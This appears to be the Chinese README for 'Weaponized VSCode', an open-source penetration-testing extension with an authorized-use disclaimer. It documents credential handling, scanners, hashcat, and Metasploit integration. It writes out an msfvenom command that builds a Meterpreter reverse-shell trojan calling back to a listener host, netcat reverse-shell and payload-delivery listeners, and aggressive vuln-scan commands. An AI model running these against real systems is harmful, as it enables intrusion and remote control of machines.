# Weaponized VSCode Extension

![icon](./images/icon.png)

**[English Version](./README_EN.md)**

> 🔫 专为渗透测试和网络安全工作流设计的强大 VSCode 扩展

一款功能强大的 VSCode 扩展，专门为渗透测试和网络安全工作流程设计。本扩展提供了集成工具，可直接在 VSCode 环境中进行有效负载生成、主机管理、凭证处理和安全扫描。

## 目录

- [功能特性](#功能特性)
- [安装说明](#安装说明)
- [快速开始](#快速开始)
- [详细使用指南](#详细使用指南)
  - [工作区初始化](#工作区初始化)
  - [主机管理](#主机管理)
  - [凭证管理](#凭证管理)
  - [命令执行](#命令执行)
  - [HTTP 请求重放](#http-请求重放)
  - [有效负载生成](#有效负载生成)
  - [网络扫描](#网络扫描)
  - [密码破解](#密码破解)
  - [文本解码](#文本解码)
  - [终端日志记录](#终端日志记录)
  - [笔记创建](#笔记创建)
- [终端配置](#终端配置)
- [代码片段](#代码片段)
- [配置选项](#配置选项)
- [依赖要求](#依赖要求)
- [安全声明](#安全声明)

---

## 功能特性

### 🎯 主机与凭证管理
- **交互式 CodeLens**：自动检测和管理 Markdown 文件中 YAML 块内的主机和凭证信息
- **主机配置**：解析和管理目标主机，包括 IP 地址、主机名、别名和域控制器设置
- **凭证管理**：处理用户凭证，支持多种认证格式（密码、NTLM 哈希）
- **环境变量导出**：一键将主机和凭证导出为终端环境变量
- **当前目标选择**：轻松切换活动目标以进行专注操作

### 🛠️ 有效负载生成与工具
- **MSFVenom 集成**：交互式有效负载创建，支持多种有效负载类型：
  - Windows/Linux Meterpreter (TCP/HTTP/HTTPS)
  - PHP、Python、Java 有效负载
  - 多种输出格式（exe, elf, psh, dll, hta-psh 等）
  - 高级选项（迁移、派生、隐蔽设置）
- **Hashcat 集成**：密码破解任务自动化
- **网络扫描**：集成扫描器支持（rustscan, nuclei, dirsearch, wfuzz, feroxbuster, ffuf 等）

### 🖥️ 终端集成
- **专用终端配置**：
  - Meterpreter Handler：自动配置 MSF 控制台处理程序
  - Netcat Handler：用于反向 Shell 的监听会话
  - Web Delivery：用于有效负载托管的 HTTP 服务器
- **命令执行**：直接从 Markdown 代码块运行命令
- **交互式任务终端**：用于长时间运行安全任务的专用终端

### 📋 工作区管理
- **项目设置**：使用以安全为中心的文件夹结构自动初始化工作区
- **文件监控**：跨 Markdown 文件实时同步主机/凭证更改
- **变量处理**：从工作区状态动态生成环境变量

### 🔍 智能 CodeLens 功能
- **导出功能**：生成环境变量、/etc/hosts 条目、YAML 配置
- **格式转换**：将凭证转换为 Impacket/NetExec 兼容格式
- **状态管理**：切换主机和凭证的当前/活动状态
- **命令集成**：直接从文档执行相关命令

### 🌐 HTTP 请求重放
- **原始 HTTP 请求**：直接从 Markdown 中的 HTTP 代码块发送原始 HTTP/HTTPS 请求
- **cURL 转换**：将原始 HTTP 请求转换为 cURL 命令
- **响应查看**：在 VSCode 中直接查看 HTTP 响应

### 🔄 目标切换与管理
- **主机切换**：在所有 Markdown 文件中快速切换不同目标主机
- **用户切换**：轻松切换凭证以适应不同的认证上下文
- **全局状态管理**：集中管理当前活动目标

### 🧮 文本解码与分析
- **CyberChef 集成**：一键使用 CyberChef 的 Magic 配方解码选定文本
- **自动编码检测**：智能检测和解码常见编码格式
- **浏览器集成**：与 VSCode 的简单浏览器无缝集成

### 📝 终端日志与记录
- **命令日志**：自动记录终端命令和输出
- **可配置日志级别**：选择仅记录命令或同时记录命令和输出
- **会话跟踪**：使用时间戳和工作目录跟踪终端会话
- **日志管理**：根据测试的不同阶段按需启动/停止日志记录

### 📋 增强笔记管理
- **Foam 集成**：为主机、用户和服务创建结构化笔记
- **基于模板创建**：使用预定义模板自动创建笔记
- **图形可视化**：可视化目标和凭证之间的关系

### 💡 代码片段支持
- **GTFOBins**：Linux 二进制文件提权代码片段
- **LOLBAS**：Windows Living Off The Land 二进制文件代码片段
- **BloodHound**：Active Directory 关系查询代码片段
- **自定义武器片段**：常用渗透测试命令和配置

### 🔗 定义提供器
- **BloodHound 定义**：悬停显示 BloodHound 查询关键字的详细说明

---

## 安装说明

### 从源码编译安装

```bash
# 克隆仓库
git clone https://github.com/WeaponizedVSCode/Extension.git
cd Extension

# 安装依赖
pnpm install

# 构建扩展
pnpm run vscode:publish
# 将在仓库根目录生成 .vsix 文件

# 在 VSCode 中安装
code --install-extension ./core-*.vsix
```

### 依赖扩展

本扩展依赖 **Foam** 扩展进行笔记管理：

1. 在 VSCode 扩展市场搜索 `foam.foam-vscode`
2. 安装 Foam 扩展
3. 重新加载 VSCode

---

## 快速开始

### 1. 初始化工作区

打开 VSCode 命令面板（`Ctrl+Shift+P` 或 `Cmd+Shift+P`），运行：

```
weapon management: Setup/Create/Init weaponized vscode folder in current workspace
```

这将创建必要的文件夹结构和配置文件：

```
workspace/
├── .foam/
│   └── templates/          # Foam 笔记模板
│       ├── finding.md
│       ├── host.md
│       ├── service.md
│       └── user.md
├── .vscode/
│   ├── settings.json       # 扩展配置
│   ├── extensions.json     # 推荐扩展
│   └── .zshrc             # Shell 环境配置
├── hosts/                  # 主机定义文件
│   └── [category]/
│       └── *.md
├── users/                  # 凭证定义文件
│   └── [category]/
│       └── *.md
└── services/               # 服务信息文件
    └── [category]/
        └── *.md
```

### 2. 配置基本设置

打开 `.vscode/settings.json`，配置您的本地主机信息：

```json
{
  "weaponized.lhost": "10.10.14.5",
  "weaponized.lport": 4444,
  "weaponized.listenon": 8000
}
```

### 3. 创建第一个目标

在 `hosts/` 目录下创建一个 Markdown 文件，例如 `hosts/htb/machine.md`：

```markdown
# 目标机器

## 主机信息

```yaml host
- hostname: target.htb
  ip: 10.10.10.100
  alias:
    - www.target.htb
  is_dc: false
  is_current: true
  is_current_dc: false
  props: {}
```

保存文件后，您将看到 CodeLens 按钮出现在 YAML 块上方。

---

## 详细使用指南

### 工作区初始化

#### Shell 环境配置

为了让环境变量在新终端中自动加载，需要在您的 shell 配置文件（`.zshrc` 或 `.bashrc`）中添加以下内容：

```bash
# Weaponized VSCode 环境变量自动加载
weapon_vscode_launch_helper () {
  if [ -n "$PROJECT_FOLDER" ]; then
    if [ -f "$PROJECT_FOLDER/.vscode/.zshrc" ]; then
      source $PROJECT_FOLDER/.vscode/.zshrc
    fi
  fi
}
weapon_vscode_launch_helper
```

运行 `weapon management: Setup/Create/Init weaponized vscode folder in current workspace` 命令时，扩展会检测您的 shell 配置并提供复制按钮。

---

### 主机管理

#### 创建主机定义

在 `hosts/` 或 `hosts/[category]/` 目录下的 Markdown 文件中添加 YAML 块：

```markdown
## 目标主机

```yaml host
- hostname: dc01.corp.local
  ip: 192.168.1.10
  alias:
    - corp.local
    - domain.corp.local
  is_dc: true
  is_current: true
  is_current_dc: true
  props:
    ENV_DOMAIN: corp.local
    ENV_DC: dc01.corp.local
```

#### 主机字段说明

| 字段 | 类型 | 描述 |
|------|------|------|
| `hostname` | string | 主机名 |
| `ip` | string | IP 地址 |
| `alias` | string[] | 主机别名列表 |
| `is_dc` | boolean | 是否为域控制器 |
| `is_current` | boolean | 是否为当前活动目标 |
| `is_current_dc` | boolean | 是否为当前活动域控制器 |
| `props` | object | 自定义属性（以 `ENV_` 开头的会导出为环境变量） |

#### CodeLens 操作

在主机 YAML 块上方，您将看到以下 CodeLens 按钮：

- **export to terminal**：将主机信息导出为环境变量到终端
- **export as current**：将主机设为当前目标并导出
- **set as current**：设置主机为当前活动目标
- **unset as current**：取消主机的当前状态

#### 导出的环境变量

当主机被标记为 `is_current: true` 时，导出以下变量：

```bash
export CURRENT_HOST='dc01.corp.local'
export HOST='dc01.corp.local'
export DOMAIN='dc01.corp.local'
export RHOST='192.168.1.10'
export IP='192.168.1.10'
export TARGET='dc01.corp.local'
```

#### 切换当前主机

使用命令面板运行：

```
weapon management: Switch/Set current host
```

从列表中选择目标主机，扩展将自动更新所有相关 Markdown 文件中的 `is_current` 状态。

#### 查看所有主机

运行命令：

```
weapon management: List/Dump all hosts
```

将以表格形式显示所有已发现的主机信息。

---

### 凭证管理

#### 创建凭证定义

在 `users/` 或 `users/[category]/` 目录下的 Markdown 文件中添加 YAML 块：

```markdown
## 凭证信息

```yaml credentials
- user: administrator
  password: P@ssw0rd123
  login: CORP
  is_current: true
  props: {}

- user: svc_backup
  nt_hash: 5fbc3d5fec8206a30f4b6c473d68ae76
  login: CORP
  is_current: false
  props:
    ENV_SVC_USER: svc_backup
```

#### 凭证字段说明

| 字段 | 类型 | 描述 |
|------|------|------|
| `user` | string | 用户名 |
| `password` | string | 密码（与 nt_hash 二选一） |
| `nt_hash` | string | NTLM 哈希值（与 password 二选一） |
| `login` | string | 登录域或上下文 |
| `is_current` | boolean | 是否为当前活动凭证 |
| `props` | object | 自定义属性 |

#### CodeLens 操作

在凭证 YAML 块上方，您将看到以下 CodeLens 按钮：

- **export to terminal**：将凭证导出为环境变量
- **export as current**：将凭证设为当前并导出
- **dump as impacket**：以 Impacket 格式输出凭证
- **dump as nxc**：以 NetExec (nxc) 格式输出凭证
- **set as current**：设置凭证为当前活动凭证
- **unset as current**：取消凭证的当前状态

#### Impacket 格式输出示例

```bash
# 使用密码
'CORP'/'administrator':'P@ssw0rd123'

# 使用 NTLM 哈希
'CORP'/'svc_backup' -hashes ':5fbc3d5fec8206a30f4b6c473d68ae76'
```

#### NetExec (nxc) 格式输出示例

```bash
# 使用密码
'CORP' -u 'administrator' -p 'P@ssw0rd123'

# 使用 NTLM 哈希
'CORP' -u 'svc_backup' -H ':5fbc3d5fec8206a30f4b6c473d68ae76'
```

#### 切换当前用户

使用命令面板运行：

```
weapon management: Switch/Set current user
```

---

### 命令执行

#### 从代码块执行命令

在 Markdown 文件中添加 Shell 代码块：

```markdown
## 枚举命令

```bash
nmap -sS -sV -O $TARGET
```

```powershell
Get-ADUser -Filter * | Select-Object Name,SamAccountName
```
```

支持的代码块类型：
- `bash`
- `sh`
- `zsh`
- `powershell`

#### CodeLens 操作

每个代码块上方会显示：

- **Run command in terminal**：在终端中执行命令
- **Copy commands**：复制命令到剪贴板

命令中可以使用环境变量，如 `$TARGET`、`$USER`、`$PASSWORD` 等。

---

### HTTP 请求重放

#### 发送原始 HTTP 请求

在 Markdown 文件中添加 HTTP 代码块：

```markdown
## API 测试

```http
POST /api/login HTTP/1.1
Host: target.htb
Content-Type: application/json
Content-Length: 42

{"username": "admin", "password": "test"}
```
```

#### CodeLens 操作

HTTP 代码块上方会显示：

- **Send HTTP Request**：发送 HTTP 请求
- **Send HTTPS Request**：发送 HTTPS 请求
- **Convert to cURL**：转换为 cURL 命令

响应将在新的编辑器标签页中显示。

---

### 有效负载生成

#### 创建 MSFVenom 有效负载

运行命令：

```
weapon task: Create msfvenom payload
```

#### 交互式配置流程

1. **选择有效负载类型**：
   - `windows/x64/meterpreter/reverse_tcp`
   - `windows/meterpreter/reverse_tcp`
   - `linux/x64/meterpreter/reverse_tcp`
   - `php/meterpreter/reverse_tcp`
   - `python/meterpreter/reverse_tcp`
   - `java/meterpreter/reverse_tcp`
   - 等等...

2. **选择输出格式**：
   - `exe` - Windows 可执行文件
   - `elf` - Linux 可执行文件
   - `psh` - PowerShell 脚本
   - `dll` - Windows 动态链接库
   - `hta-psh` - HTA PowerShell
   - `raw` - 原始 shellcode
   - `jsp`/`war` - Java 有效负载
   - 等等...

3. **选择高级选项**（可多选）：
   - `PrependMigrate=true PrependMigrateProc=explorer.exe` - 自动迁移进程
   - `PrependFork=true` - 派生新进程
   - `AutoSystemInfo=false` - 禁用自动系统信息收集
   - 等等...

4. **指定输出文件名**：
   - 默认：`./trojan`
   - 支持变量：`${workspaceFolder}/payloads/shell`

5. **启动监听器**：
   - 选择 "Yes" 将自动启动 Meterpreter handler

#### 生成的命令示例

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 PrependMigrate=true PrependMigrateProc=explorer.exe -o ./trojan.exe -f exe
```

---

### 网络扫描

#### 运行扫描器

运行命令：

```
weapon task: Run scanner over target
```

#### 扫描流程

1. **选择目标主机**：从已发现的主机列表中选择
2. **选择扫描选项**：主机名、IP 或别名
3. **选择扫描器**：从配置的扫描器列表中选择

#### 默认扫描器配置

| 扫描器 | 命令 |
|--------|------|
| rustscan | `rustscan -a $TARGET -- --script=vuln -A` |
| nuclei | `nuclei -target $TARGET` |
| dirsearch | `dirsearch -u http://$TARGET` |
| dirsearch https | `dirsearch -u https://$TARGET` |
| feroxbuster | `feroxbuster -u http://$TARGET -w ... -x php,html,txt -t 50` |
| wfuzz subdomain | `wfuzz -c -w ... -u http://$TARGET -H 'Host: FUZZ.$TARGET' --hc 404` |
| ffuf subdomain | `ffuf -c -w ... -u http://$TARGET -H 'Host: FUZZ.$TARGET' -fc 404` |

#### 自定义扫描器

在 `settings.json` 中添加自定义扫描器：

```json
{
  "weaponized.scanners": {
    "nmap_full": "nmap -sS -sV -O -A -T4 --script vuln $TARGET",
    "masscan": "masscan -p1-65535 $TARGET --rate=1000",
    "custom_scan": "my-custom-scanner --target $TARGET --aggressive"
  }
}
```

---

### 密码破解

#### 使用 Hashcat 破解

运行命令：

```
weapon task: Crack hashes with hashcat
```

#### 交互式配置

1. **选择哈希文件**：浏览并选择包含哈希的文件
2. **选择哈希模式**：
   - `Dictionary Attack (0)` - 字典攻击
   - `Combination Attack (1)` - 组合攻击
   - `Brute-force Attack (3)` - 暴力破解
   - `Rule-based Attack (6)` - 基于规则的攻击

3. **选择哈希类型**：
   - MD5、SHA1、SHA256
   - NTLM、NetNTLMv2
   - Kerberos TGS、AS-REP
   - 等等...

4. **选择设备**：CPU 或 GPU
5. **指定字典/选项**：默认使用 `$ROCKYOU`

---

### 文本解码

#### CyberChef Magic 解码

1. 在编辑器中选择需要解码的文本
2. 运行命令：

```
weapon feature: Decode selected text
```

3. CyberChef 将在 VSCode 简单浏览器中打开，自动应用 Magic 配方尝试解码

支持自动检测的编码格式：
- Base64
- URL 编码
- Hex
- 旋转编码（ROT13等）
- 其他常见编码

---

### 终端日志记录

#### 启动终端日志

运行命令：

```
weapon recorder: Start/Register terminal logger
```

#### 配置选项

1. **日志文件路径**：
   - 默认：`${workspaceFolder}/.vscode/.terminal.log`
   - 支持自定义路径

2. **日志级别**：
   - `command-only`：仅记录命令
   - `output-only`：仅记录输出
   - `command-and-output`：记录命令和输出
   - `netcat-handler`：专用于 netcat 处理程序的模式

3. **终端选择**：
   - 选择特定终端进程 ID
   - 或选择 "All terminals" 记录所有终端

#### 停止终端日志

运行命令：

```
weapon recorder: Stop/Unregister terminal logger
```

#### 自动启用日志

在 `settings.json` 中配置：

```json
{
  "weaponized.terminal-log.enabled": true,
  "weaponized.terminal-log.path": "${workspaceFolder}/.vscode/.terminal.log",
  "weaponized.terminal-log.level": "command-and-output"
}
```

---

### 笔记创建

#### 使用 Foam 模板创建笔记

运行命令：

```
weapon foam: Create/New note (user/host/service) from foam template
```

#### 可用模板

1. **host.md**：主机笔记模板
2. **user.md**：用户凭证笔记模板
3. **service.md**：服务信息笔记模板
4. **finding.md**：发现/漏洞笔记模板

#### 查看关系图

运行命令：

```
weapon foam: Show Foam Graph
```

可视化查看主机、用户、服务之间的关系。

---

## 终端配置

### 专用终端配置

本扩展提供以下专用终端配置：

#### Meterpreter Handler

自动启动带有配置好的 handler 的 msfconsole。

在终端下拉菜单中选择 **"meterpreter handler"**。

#### MSFConsole

直接启动 msfconsole（如果配置了资源文件，将自动加载）。

在终端下拉菜单中选择 **"msfconsole"**。

#### Netcat Handler

启动 netcat 监听会话以接收反向 Shell。

在终端下拉菜单中选择 **"netcat handler"**。

默认命令：
```bash
rlwrap -I -cAr netcat -lvvp ${config:weaponized.lport}
```

#### Web Delivery

启动 HTTP 服务器用于有效负载分发。

在终端下拉菜单中选择 **"web delivery"**。

默认命令：
```bash
simplehttpserver -listen 0.0.0.0:${config:weaponized.listenon} -verbose -upload
```

---

## 代码片段

### 使用代码片段

在 Markdown 文件中输入代码片段前缀，然后按 `Tab` 或 `Enter` 展开。

### 可用代码片段

#### 武器代码片段

| 前缀 | 描述 |
|------|------|
| `find suid` | 查找具有 SUID 权限的文件 |
| `pty python` | Python PTY 控制台 |
| `psql` | PostgreSQL 登录/RCE |
| `` ```yaml credentials `` | 用户凭证 YAML 模板 |
| `` ```yaml host `` | 主机信息 YAML 模板 |
| `` ```sh `` | Shell 代码块 |

#### GTFOBins 代码片段

Linux 二进制文件的提权代码片段，包括：
- 文件读取
- 文件写入
- SUID 利用
- Shell 获取
- 等等...

#### LOLBAS 代码片段

Windows Living Off The Land 二进制文件代码片段。

#### BloodHound 代码片段

Active Directory 环境分析查询代码片段。

---

## 配置选项

### 完整配置示例

```json
{
  // === 网络配置 ===
  "weaponized.lhost": "10.10.14.5",
  "weaponized.lport": 4444,
  "weaponized.listenon": 8000,

  // === 工具路径 ===
  "weaponized.netcat": "rlwrap -I -cAr netcat -lvvp ${config:weaponized.lport}",
  "weaponized.webdelivery": "python3 -m http.server ${config:weaponized.listenon}",
  "weaponized.hashcat": "/usr/bin/hashcat",

  // === Metasploit 配置 ===
  "weaponized.msf.venom": "/usr/bin/msfvenom",
  "weaponized.msf.console": "/usr/bin/msfconsole",
  "weaponized.msf.resourcefile": "./handlers.rc",

  // === 用户变量 ===
  "weaponized.user_vars": {
    "kali_wordlists": "/usr/share/wordlists",
    "kali_seclists": "/usr/share/seclists",
    "dns_top100000": "${config:weaponized.user_vars.kali_seclists}/Discovery/DNS/bitquark-subdomains-top100000.txt",
    "dir_raft_medium": "${config:weaponized.user_vars.kali_seclists}/Discovery/Web-Content/raft-medium-directories.txt",
    "rockyou": "${config:weaponized.user_vars.kali_wordlists}/rockyou.txt"
  },

  // === 环境变量 ===
  "weaponized.envs": {
    "WORDLIST_DIR": "/usr/share/wordlists",
    "CUSTOM_PAYLOAD_DIR": "./payloads"
  },

  // === 扫描器配置 ===
  "weaponized.scanners": {
    "rustscan": "rustscan -a $TARGET -- --script=vuln -A",
    "nuclei": "nuclei -target $TARGET",
    "dirsearch": "dirsearch -u http://$TARGET",
    "nmap_full": "nmap -sS -sV -O -A -T4 --script vuln $TARGET"
  },

  // === 终端日志 ===
  "weaponized.terminal-log.enabled": false,
  "weaponized.terminal-log.path": "${workspaceFolder}/.vscode/.terminal.log",
  "weaponized.terminal-log.level": "command-only"
}
```

### 配置参数详解

#### 网络配置

| 参数 | 类型 | 默认值 | 描述 |
|------|------|--------|------|
| `weaponized.lhost` | string | `$LHOST` | 本地主机 IP，用于反向连接 |
| `weaponized.lport` | integer | `6879` | 反向 Shell 监听端口 |
| `weaponized.listenon` | integer | `8890` | Web 服务器监听端口 |

#### 工具路径

| 参数 | 类型 | 默认值 | 描述 |
|------|------|--------|------|
| `weaponized.netcat` | string | `rlwrap -I -cAr netcat -lvvp ...` | Netcat 命令模板 |
| `weaponized.webdelivery` | string | `simplehttpserver ...` | Web 分发服务器命令 |
| `weaponized.hashcat` | string | `hashcat` | Hashcat 可执行文件路径 |

#### Metasploit 配置

| 参数 | 类型 | 默认值 | 描述 |
|------|------|--------|------|
| `weaponized.msf.venom` | string | `msfvenom` | MSFVenom 路径 |
| `weaponized.msf.console` | string | `msfconsole` | MSFConsole 路径 |
| `weaponized.msf.resourcefile` | string | - | MSF 资源文件路径 |

#### 变量替换

扩展支持以下动态变量替换：

| 变量 | 描述 |
|------|------|
| `$TARGET` | 当前目标主机名/IP |
| `$LHOST` | 本地主机配置 |
| `$LPORT` | 本地端口配置 |
| `${config:weaponized.setting}` | 任何扩展配置 |
| `${workspaceFolder}` | 工作区根目录 |
| 自定义环境变量 | 来自 `weaponized.envs` |

---

## 依赖要求

### 系统要求

- **VSCode**：版本 1.101.0 或更高
- **Node.js**：用于扩展运行时
- **操作系统**：macOS、Linux 或 Windows

### 必需扩展

- **Foam** (`foam.foam-vscode`)：用于笔记管理和图形可视化

### 推荐安全工具（可选）

#### Metasploit Framework
- `msfvenom` - 有效负载生成
- `msfconsole` - Handler 管理

#### 密码破解
- `hashcat` - GPU 加速密码破解

#### 网络扫描器
- `rustscan` - 快速端口扫描
- `nmap` - 网络发现和安全审计
- `nuclei` - 漏洞扫描
- `dirsearch` - 目录枚举
- `feroxbuster` - 目录暴力破解
- `wfuzz` / `ffuf` - Web 应用模糊测试

#### Shell 处理
- `netcat` / `ncat` - 基础反向 Shell 处理
- `rlwrap` - Readline 包装器，改善 Shell 交互
- `pwncat-cs` - 增强型反向 Shell 处理（可选替代）

---

## 安全声明

⚠️ **警告**：本扩展仅用于授权的渗透测试和安全研究。

在使用这些工具针对任何系统之前，请确保您拥有适当的授权。未经授权使用这些工具可能违反法律。

---

## 许可证

MIT License - 详见 [LICENSE](./LICENSE) 文件

---

## 贡献

欢迎提交 Issue 和 Pull Request！

## 支持

如有问题或建议，请在 [GitHub Issues](https://github.com/WeaponizedVSCode/Extension/issues) 中提出。
